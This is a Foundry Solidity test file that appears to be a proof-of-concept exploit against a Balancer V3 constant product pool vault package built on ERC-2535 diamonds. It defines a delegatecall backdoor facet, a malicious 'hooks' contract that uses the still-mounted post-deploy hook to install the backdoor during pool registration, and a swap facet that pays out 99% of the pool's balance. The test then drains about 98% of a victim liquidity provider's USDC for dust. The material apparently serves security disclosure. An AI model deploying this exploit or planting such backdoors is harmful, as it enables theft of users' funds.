// SPDX-License-Identifier: BSL-1.1
pragma solidity ^0.8.0;

import {IERC20} from "@crane/contracts/interfaces/IERC20.sol";
import {IDiamond} from "@crane/contracts/interfaces/IDiamond.sol";
import {IDiamondLoupe} from "@crane/contracts/interfaces/IDiamondLoupe.sol";
import {IPostDeployAccountHook} from "@crane/contracts/interfaces/IPostDeployAccountHook.sol";
import {ERC2535Repo} from "@crane/contracts/introspection/ERC2535/ERC2535Repo.sol";
import {IRateProvider} from "@crane/contracts/interfaces/protocols/dexes/balancer/v3/IRateProvider.sol";
import {
    TokenConfig,
    TokenType,
    LiquidityManagement,
    HookFlags,
    PoolSwapParams
} from "@crane/contracts/interfaces/protocols/dexes/balancer/v3/VaultTypes.sol";
import {IPermit2} from "@crane/contracts/interfaces/protocols/utils/permit2/IPermit2.sol";

import {IVaultRegistryDeployment} from "contracts/interfaces/IVaultRegistryDeployment.sol";
import {IVaultRegistryVaultQuery} from "contracts/interfaces/IVaultRegistryVaultQuery.sol";
import {IVaultFeeOracleQuery} from "contracts/interfaces/IVaultFeeOracleQuery.sol";
import {IBalancerV3ConstantProductPoolStandardVaultPkg} from
    "contracts/protocols/dexes/balancer/v3/pools/constProd/IBalancerV3ConstantProductPoolStandardVaultPkg.sol";
import {BalancerV3ConstantProductPool_FactoryService} from
    "contracts/protocols/dexes/balancer/v3/pools/constProd/BalancerV3ConstantProductPool_FactoryService.sol";
import {TestBase_StandardExchangeBufferPool} from
    "test/foundry/spec/protocols/dexes/balancer/v3/pools/constProd/standardExchange/bases/TestBase_StandardExchangeBufferPool.sol";

/// Facet the attacker plants: arbitrary delegatecall, attacker only.
contract BackdoorFacet {
    address public immutable ATTACKER;
    constructor(address a) { ATTACKER = a; }
    function exec(address target, bytes calldata data) external {
        require(msg.sender == ATTACKER, "no");
        (bool ok, bytes memory r) = target.delegatecall(data);
        if (!ok) assembly { revert(add(r, 32), mload(r)) }
    }
}

/// Malicious onSwap: pays out 99% of tokenOut balance for any input.
contract DrainSwapFacet {
    function onSwap(PoolSwapParams calldata p) external pure returns (uint256) {
        return p.balancesScaled18[p.indexOut] * 99 / 100;
    }
}

/// Code the backdoor delegatecalls later (runs in pool storage).
contract RouteSwapImpl {
    function route(address drainFacet) external {
        IDiamond.FacetCut[] memory c = new IDiamond.FacetCut[](1);
        bytes4[] memory s = new bytes4[](1);
        s[0] = DrainSwapFacet.onSwap.selector;
        c[0] = IDiamond.FacetCut(drainFacet, IDiamond.FacetCutAction.Replace, s);
        ERC2535Repo._processFacetCuts(c);
    }
}

/// "Hooks contract" chosen by the attacker. Reports no hook flags (looks inert).
contract EvilHooks {
    address public immutable BACKDOOR;
    constructor(address backdoor) { BACKDOOR = backdoor; }

    function onRegister(address, address pool, TokenConfig[] memory, LiquidityManagement calldata)
        external
        returns (bool)
    {
        // The pool diamond still has Crane's PostDeployAccountHookFacet mounted; it delegatecalls msg.sender.
        IPostDeployAccountHook(pool).postDeploy();
        return true;
    }

    function getHookFlags() external pure returns (HookFlags memory f) { return f; }

    /// Runs via delegatecall in the pool diamond's storage context.
    function postDeploy(address) external returns (bool) {
        IDiamond.FacetCut[] memory c = new IDiamond.FacetCut[](1);
        bytes4[] memory s = new bytes4[](1);
        s[0] = BackdoorFacet.exec.selector;
        c[0] = IDiamond.FacetCut(BACKDOOR, IDiamond.FacetCutAction.Add, s);
        ERC2535Repo._processFacetCuts(c);
        return true;
    }
}

contract PostDeployHookHijackTest is TestBase_StandardExchangeBufferPool {
    using BalancerV3ConstantProductPool_FactoryService for IVaultRegistryDeployment;

    IBalancerV3ConstantProductPoolStandardVaultPkg cpPkg;

    function _registerCpPkg() internal {
        IBalancerV3ConstantProductPoolStandardVaultPkg.PkgInit memory p_;
        p_.basicVaultFacet = multiAssetBasicVaultFacet;
        p_.standardVaultFacet = multiAssetStandardVaultFacet;
        p_.balancerV3VaultAwareFacet = balancerV3VaultAwareFacet;
        p_.betterBalancerV3PoolTokenFacet = betterBalancerV3PoolTokenFacet;
        p_.defaultPoolInfoFacet = defaultPoolInfoFacet;
        p_.standardSwapFeePercentageBoundsFacet = standardSwapFeePercentageBoundsFacet;
        p_.unbalancedLiquidityInvariantRatioBoundsFacet = unbalancedLiquidityInvariantRatioBoundsFacet;
        p_.balancerV3AuthenticationFacet = balancerV3AuthenticationFacet;
        p_.balancerV3ConstProdPoolFacet =
            BalancerV3ConstantProductPool_FactoryService.deployBalancerV3ConstantProductPoolFacet(create3Factory);
        p_.vaultRegistry = IVaultRegistryDeployment(address(indexedexManager));
        p_.vaultFeeOracle = IVaultFeeOracleQuery(address(indexedexManager));
        p_.balancerV3Vault = bv3Vault;
        p_.diamondFactory = diamondPackageFactory;
        vm.startPrank(owner);
        cpPkg = IVaultRegistryDeployment(address(indexedexManager)).deployBalancerV3ConstantProductPoolStandardVaultPkg(p_);
        vm.stopPrank();
    }

    function _approveAll(address who) internal {
        vm.startPrank(who);
        dai.approve(address(router), type(uint256).max);
        usdc.approve(address(router), type(uint256).max);
        dai.approve(address(permit2), type(uint256).max);
        usdc.approve(address(permit2), type(uint256).max);
        IPermit2(address(permit2)).approve(address(dai), address(router), type(uint160).max, type(uint48).max);
        IPermit2(address(permit2)).approve(address(usdc), address(router), type(uint160).max, type(uint48).max);
        vm.stopPrank();
    }

    address attacker;
    address victim;
    address evilPool;
    BackdoorFacet backdoor;
    DrainSwapFacet drain;
    RouteSwapImpl routeImpl;

    function _attackerDeploys() internal {
        vm.startPrank(attacker);
        backdoor = new BackdoorFacet(attacker);
        EvilHooks hooks = new EvilHooks(address(backdoor));
        drain = new DrainSwapFacet();
        routeImpl = new RouteSwapImpl();
        TokenConfig[] memory t_ = new TokenConfig[](2);
        (address a, address b) = address(dai) < address(usdc) ? (address(dai), address(usdc)) : (address(usdc), address(dai));
        t_[0] = TokenConfig(IERC20(a), TokenType.STANDARD, IRateProvider(address(0)), false);
        t_[1] = TokenConfig(IERC20(b), TokenType.STANDARD, IRateProvider(address(0)), false);
        evilPool = cpPkg.deployVault(t_, address(hooks)); // permissionless helper -> registry.deployVault
        vm.stopPrank();
    }

    function _victimSeeds() internal {
        dai.mint(victim, 1_000 ether);
        usdc.mint(victim, 1_000 ether);
        _approveAll(victim);
        IERC20[] memory toks = bv3Vault.getPoolTokens(evilPool);
        uint256[] memory amts = new uint256[](2);
        amts[0] = 1_000 ether;
        amts[1] = 1_000 ether;
        vm.prank(victim);
        router.initialize(evilPool, toks, amts, 0, false, "");
    }

    function _attackerDrains(uint256 dust) internal returns (uint256 out) {
        dai.mint(attacker, dust);
        _approveAll(attacker);
        vm.startPrank(attacker);
        BackdoorFacet(evilPool).exec(address(routeImpl), abi.encodeCall(RouteSwapImpl.route, (address(drain))));
        out = router.swapSingleTokenExactIn(evilPool, IERC20(address(dai)), IERC20(address(usdc)), dust, 0, block.timestamp, false, "");
        vm.stopPrank();
    }

    function test_unprivilegedDeployerBackdoorsRegisteredPoolAndDrainsLP() public {
        // setup (privileged, before attack): owner registers the canonical ConstProd package
        _registerCpPkg();
        attacker = makeAddr("attacker");
        victim = makeAddr("victimLP");

        _attackerDeploys();

        // Pool is a registry-registered vault of a registered package.
        assertTrue(IVaultRegistryVaultQuery(address(indexedexManager)).isVault(evilPool), "registered");
        // Post-deploy hook facet was removed as designed ...
        assertEq(IDiamondLoupe(evilPool).facetAddress(IPostDeployAccountHook.postDeploy.selector), address(0));
        // ... but the attacker's selector was cut in during the window.
        assertEq(IDiamondLoupe(evilPool).facetAddress(BackdoorFacet.exec.selector), address(backdoor), "backdoor mounted");

        _victimSeeds();
        uint256 victimBpt = IERC20(evilPool).balanceOf(victim);
        emit log_named_uint("victim BPT", victimBpt);

        uint256 usdc0 = usdc.balanceOf(attacker);
        uint256 dust = 1e12;
        uint256 out = _attackerDrains(dust);
        uint256 gained = usdc.balanceOf(attacker) - usdc0;
        emit log_named_uint("attacker DAI spent", dust);
        emit log_named_uint("attacker USDC gained", gained);
        assertEq(dai.balanceOf(attacker), 0, "spent all dust");
        assertEq(out, gained);
        assertGt(gained, 980 ether, "drained ~99% of victim USDC");
    }
}
